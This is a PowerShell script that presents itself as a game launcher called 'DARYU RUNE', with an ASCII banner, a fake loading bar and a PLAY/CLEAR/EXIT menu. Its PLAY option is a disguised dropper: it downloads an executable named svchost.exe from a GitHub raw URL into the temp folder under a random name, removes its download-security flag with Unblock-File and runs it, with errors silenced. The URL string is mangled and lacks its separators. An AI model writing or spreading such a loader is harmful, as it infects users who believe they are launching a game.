$ErrorActionPreference = "SilentlyContinue"

[Console]::Title = "DARYU RUNE"

function Show-Header {
    Clear-Host

    Write-Host ""
    Write-Host "██████╗  █████╗ ██████╗ ██╗   ██╗██╗   ██╗" -ForegroundColor Magenta
    Write-Host "██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝██║   ██║" -ForegroundColor Magenta
    Write-Host "██║  ██║███████║██████╔╝ ╚████╔╝ ██║   ██║" -ForegroundColor White
    Write-Host "██║  ██║██╔══██║██╔══██║  ╚██╔╝  ██║   ██║" -ForegroundColor White
    Write-Host "██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝" -ForegroundColor Magenta
    Write-Host "╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ " -ForegroundColor Magenta

    Write-Host ""
    Write-Host " ─────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""
}

function Show-Loading {
    Clear-Host

    Write-Host ""
    Write-Host "                D A R Y U   R U N E" -ForegroundColor White
    Write-Host ""

    for ($i = 0; $i -le 100; $i += 5)
    {
        $bar = ("█" * ($i / 5)).PadRight(20, '░')
        Write-Host "`r[$bar] $i%" -NoNewline -ForegroundColor Magenta
        Start-Sleep -Milliseconds 80
    }

    Start-Sleep 1
}

function Write-Console {
    param (
        [string]$Message,
        [string]$Type = "INFO"
    )

    switch ($Type) {

        "SUCCESS" {
            Write-Host "  [+] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -ForegroundColor White
        }

        "INFO" {
            Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray
            Write-Host $Message -ForegroundColor White
        }

        "INPUT" {
            Write-Host "  [>] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -NoNewline -ForegroundColor White
        }
    }
}

# --- เริ่มทำงานโปรแกรม ---
Show-Loading

while ($true)
{
    Show-Header

    Write-Console "1. PLAY"  "INFO"
    Write-Console "2. CLEAR" "INFO"
    Write-Console "3. EXIT"  "INFO"

    Write-Host ""

    Write-Console "SELECT : " "INPUT"

    $choice = $Host.UI.ReadLine()

    switch ($choice)
    {
        "1" {
            Clear-Host
            Show-Header

            Write-Console "DOWNLOADING..." "INFO"

            # ⚠️ อย่าลืมใส่ URL ตรงนี้ และเปลี่ยนชื่อไฟล์ setup.exe ปลายทางตามต้องการนะครับ
            $url  = "httpsraw.githubusercontent.comdraft7973-opsJETT.EXErefsheadsmainsvchost.exe" 
            $path = "$env:TEMP\T1252151512512.exe" 

            try {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

                $wc = New-Object Net.WebClient
                $wc.Headers.Add("User-Agent","Mozilla/5.0")

                $wc.DownloadFile($url, $path)

                Start-Sleep 1

                if (Test-Path $path)
                {
                    Write-Host ""
                    Write-Console "INSTALL SUCCESS" "SUCCESS"

                    Unblock-File $path -ErrorAction SilentlyContinue
                    Start-Process $path
                }
                else
                {
                    Write-Host ""
                    Write-Console "INSTALL FAILED (File not found)" "INFO"
                }
            }
            catch {
                Write-Host ""
                Write-Host "  [!] Error: $_" -ForegroundColor Red
                Write-Console "INSTALL FAILED" "INFO"
            }

            Write-Host ""
            Pause
        }

        "2" {
            Write-Host ""
            Write-Console "CLEAR COMPLETE" "SUCCESS"
            Pause
        }

        "3" {
            exit
        }
    }
}
